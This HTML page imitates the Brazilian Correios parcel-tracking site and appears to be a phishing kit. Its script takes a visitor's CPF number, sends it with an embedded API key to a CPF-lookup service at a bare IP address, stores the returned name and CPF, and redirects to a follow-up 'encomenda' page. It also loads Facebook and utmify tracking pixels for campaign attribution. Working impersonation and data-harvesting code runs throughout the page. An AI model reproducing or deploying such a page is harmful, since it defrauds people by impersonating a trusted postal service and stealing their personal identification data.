<!DOCTYPE html><html lang="en"><head>

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="preconnect" href="https://fonts.googleapis.com/">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
  <link href="css2.html" rel="stylesheet">
  <link rel="stylesheet" href="css/SfCo78WlHNzw.css">
  <link rel="stylesheet" href="css/e8X2k3aCtOGG.css">
  <link rel="stylesheet" href="css/zdM7N9JSKWpt.css">
  <link rel="stylesheet" href="css/jtH9ojtxrWDQ.css" crossorigin="anonymous">
  <link rel="icon" type="image/x-icon" href="images/3HwwYLe2RYBV.png">
  <meta name="csrf-token" content="BvHekmyuhpxq0y4d95zDDZM0F2cRrES6DJjrP5sP">
  <link rel="stylesheet" type="text/css" href="css/l8bwAoXvNQqg.css">
  <script src="js/Aq18BmhdFiIk.js" data-utmify-prevent-subids="" async="" defer=""></script>
  <script>
  window.pixelId = "67872ae77366c649e479a3ed";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script><script async="" defer="" src="js/5gyxYSf32suo.js"></script>
  <!-- Facebook Pixel Code -->
<script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1352067339296340');
  fbq('track', 'PageView');
</script>
<noscript>
  <img height="1" width="1" style="display:none" 
       src="https://www.facebook.com/tr?id=1352067339296340&ev=PageView&noscript=1"/>
</noscript>
<!-- End Facebook Pixel Code -->
  <script>
  document.addEventListener("DOMContentLoaded", () => {
    // Função para obter parâmetros da URL
    function getUTMParams() {
      const urlParams = new URLSearchParams(window.location.search);
      const utmParams = {};
      ["utm_source", "utm_campaign", "utm_medium", "utm_content", "utm_term", "xcod"].forEach(param => {
        if (urlParams.has(param)) {
          utmParams[param] = urlParams.get(param);
        }
      });
      return utmParams;
    }

    // Adicionar os parâmetros UTM às próximas URLs
    function addUTMParamsToLinks() {
      const utmParams = getUTMParams();
      if (Object.keys(utmParams).length > 0) {
        // Seleciona todos os links da página
        const links = document.querySelectorAll("a[href]");
        links.forEach(link => {
          const url = new URL(link.href, window.location.origin);
          // Adiciona os parâmetros UTM à URL do link
          for (const [key, value] of Object.entries(utmParams)) {
            url.searchParams.set(key, value);
          }
          link.href = url.toString();
        });
      }
    }

    // Adicionar UTM às URLs de redirecionamento dinâmico
    function redirectWithUTM(baseUrl, additionalParams = {}) {
      const utmParams = getUTMParams();
      const url = new URL(baseUrl);
      // Adiciona os parâmetros UTM à URL de redirecionamento
      for (const [key, value] of Object.entries(utmParams)) {
        url.searchParams.set(key, value);
      }
      // Adiciona parâmetros adicionais, se houver
      for (const [key, value] of Object.entries(additionalParams)) {
        url.searchParams.set(key, value);
      }
      window.location.href = url.toString();
    }

    // Adiciona UTM a todos os links na página ao carregá-la
    addUTMParamsToLinks();
  });
</script>
  <title>Correios | Rastreio</title>

  <script type="text/javascript" class="flasher-js">(function() { /* Flasher Script */ })();</script>
  <script src="js/OFliEADJz57V.js" type="text/javascript"></script>
  <script src="js/RzSCSZUgpkJu.js" type="text/javascript"></script>
  <script src="js/scoQm3cSKkre.js" type="text/javascript"></script>
</head>

<body>
  <header class="w-100 font-size-16 font-weight-400 text-blue">
    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
      <span>Acessibilidade</span>
      <i class="fas fa-caret-down ml-1"></i>
    </div>
    <div class="">
      <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px">
        <div class="menu-toggle" id="menu-toggle" style="width:50px">
          <div class="bar"></div>
          <div class="bar"></div>
          <div class="bar"></div>
        </div>
        <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
          <a href="javascript:void(0);" class="py-2">
            <img src="images/p0Yc02XLpWya.png" alt="" height="25">
          </a>
        </div>
        <div class="ml-4 d-none d-lg-block " style="width:150px">
          <a href="javascript:void(0);" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
            <img src="images/I199sTZ8Ck9X.svg" alt="Correios" width="31">
            <span class="ml-1">Entrar</span>
          </a>
        </div>
      </nav>
    </div>
  </header>

  <main>
    <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
      <span class="text-blue mr-2">Portal Correios</span>
      <i class="fal fa-angle-right mr-2"></i>
      <span class="text-blue mr-2">Rastreamento</span>
      <i class="fal fa-angle-right mr-2"></i>
    </nav>

    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between" style="margin:0 auto;">
      Rastreamento
    </h1>

    <section class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">
      <h5 style="color: #003157;" class=" text-center font-weight-700 mb-4">
        <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
      </h5>

      <!-- Alteracao do Formulario -->
      <form onsubmit="consultarCpf(event)">
        <span>Deseja acompanhar seu objeto?</span><br>
        <span>Digite o CPF do comprador.</span>
        <div class="form-group mt-1">
          <input type="text" name="cpf" class="form-control" onkeyup="formatCpf(this)" placeholder="000.000.000-00">
        </div>
        <div class="form-group mt-1 d-flex justify-content-center">
          <button class="btn btn-primary" type="submit">Consultar</button>
        </div>
      </form>

      <script>
        function formatCpf(input) {
          let value = input.value.replace(/\D/g, "");
          value = value.replace(/(\d{3})(\d)/, "$1.$2");
          value = value.replace(/(\d{3})(\d)/, "$1.$2");
          value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
          input.value = value;
        }

        async function consultarCpf(event) {
  event.preventDefault();
  const cpfInput = document.querySelector("input[name='cpf']");
  const cpf = cpfInput.value.replace(/\D/g, "");
  const proxyUrl = '../proxy.php?url=';
  const apiUrl = encodeURIComponent(`http://170.82.77.232/api/simples/consultar-cpf?cpf=${cpf}&apikey=fz40ssi9zxylbfplbdxcvyeorv0drrap`);

  // Função para capturar os parâmetros do Facebook e UTM da URL
  function getFacebookUTMParams() {
    const urlParams = new URLSearchParams(window.location.search);
    const fbParams = {};
    const fbKeys = [
      "utm_source",
      "utm_campaign",
      "utm_medium",
      "utm_content",
      "utm_term",
      "xcod"
    ];

    fbKeys.forEach(param => {
      if (urlParams.has(param)) {
        fbParams[param] = urlParams.get(param);
      }
    });

    return fbParams;
  }

  try {
    const response = await fetch(proxyUrl + apiUrl);
    const data = await response.json();

    if (data.length > 0) {
      const { NOME } = data[0];
      localStorage.setItem("NOME", NOME);
      localStorage.setItem("CPF", cpf);

      // Construção da URL com os parâmetros capturados
      const fbParams = getFacebookUTMParams();
      const url = new URL("../encomenda/index.html");
      url.searchParams.set("nome", NOME);
      url.searchParams.set("cpf", cpf);

      // Adiciona os parâmetros UTM do Facebook
      for (const [key, value] of Object.entries(fbParams)) {
        url.searchParams.set(key, value);
      }

      // Redireciona o usuário
      window.location.href = url.toString();
    }
  } catch (error) {
    console.error("Erro ao consultar a API via proxy:", error);
  }
}
      </script>
    </section>

    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
      <div>
        <img src="images/cT1spApoUHBS.jpg" alt="" class="w-100">
      </div>
    </section>
  </main>

  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
    <!-- Conteudo do footer mantido -->
  </footer>

  <script src="js/YKc3rc1RtIfF.js"></script>
  <script src="js/oXIkHtN3L6x9.js"></script>

</body></html>